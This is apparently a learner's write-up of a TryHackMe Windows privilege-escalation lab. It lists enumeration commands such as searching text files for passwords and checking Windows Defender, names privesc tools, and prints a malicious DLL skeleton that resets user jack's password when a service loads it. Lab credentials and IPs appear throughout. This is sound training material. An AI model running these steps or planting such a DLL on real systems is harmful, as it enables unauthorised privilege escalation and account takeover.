# Writeup for [Windows privilege escalation](https://tryhackme.com/room/winprivesc)

## Task1: Introduction

Some information listed about usergruops and how to reach more privileged users.

## Task 2: Information Gathering

* rdp to target machine with xfreerdp `xfreerdp /u:user /p:Password1 /v:10.10.49.229`
* list user `net users`
* showing system info `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
* list installed patches `wmic qfe Caption,Description,HotFixId,InstalledOn`
* detect if Windows Defender is enabled `sc query windefend` (using powershell replace `sc` width `sc.exe`)

* (done but not useful for this task)
  * find password string in txt files `findstr /si password *.txt`
  * display network connections `netstat -ano`
  * display scheduled tasks `schtasks /query /fo LIST /v` (compared to cronjobs)
  * list drivers `driverquery`

## Task 3: Tools of the Trade

* [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
* When connected through a meterpreter shell `use multi/recon/local_exploit_suggester`


## Task 4: Vulnerable Software

* rdp to target machine with xfreerdp `xfreerdp /u:user /p:Password1 /v:10.10.194.27`
* list installed programs `wmic product get name,version,vendor`
* get some more information about runnign services `wmic service list brief | findstr "Running"`
* search for version number `wmic product get name,version,vendor | findstr "Fitbit"`
* search on kali for Fitbit exploit `searchsploit Fitbit`
* get FoxitReader Versionnubmer from binary (Powershell) `(Get-Command 'C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitReader').FileVersionInfo.FileVersion`


## Task 5: DLL Hacking

* rdp to target machine with xfreerdp `xfreerdp /u:user /p:Password1 /v:10.10.252.180`
* mingw (installable via `apt install gcc-mingw-w64-x86-64`) command to generate dll file `x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`
* restart dllsvc service `sc stop dllsvc & sc start dllsvc`
* login as user jack [howto here](https://stackoverflow.com/a/34307483/5202550)
* find flagdll.txt and print with `type ./flagdll.txt`


### Skeleton of Malicious DLL

```ps
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        # system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        system("cmd.exe /k net user jack Password1");
        ExitProcess(0);
    }
    return TRUE;
}
```
